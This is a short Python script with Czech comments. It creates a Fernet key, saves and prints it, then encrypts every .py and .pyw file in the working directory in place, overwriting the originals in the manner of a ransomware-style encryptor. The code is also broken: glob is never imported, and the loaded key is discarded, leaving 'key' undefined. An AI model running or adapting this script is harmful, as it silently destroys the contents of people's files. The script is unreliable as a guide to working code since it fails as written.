from cryptography.fernet import Fernet

def write_key():
    key = Fernet.generate_key()

    with open('mykey.key', 'wb') as mykey:
        mykey.write(key)

    print (key)


def load_key():
    return open ("mykey.key", "rb").read()

def encrypt(filename, key):
   
    f = Fernet(key)
    with open(filename, "rb") as file:
        # precteme vsechna data
        file_data = file.read()
    # zasifrujeme data
    encrypted_data = f.encrypt(file_data)
    # vytvorime novy zasifrovany soubor
    with open(filename, "wb") as file:
        file.write(encrypted_data)


write_key()
load_key()
pythonSoubory = glob.glob('*.py') + glob.glob('*.pyw')
for file in pythonSoubory:
    encrypt (file,key)
    
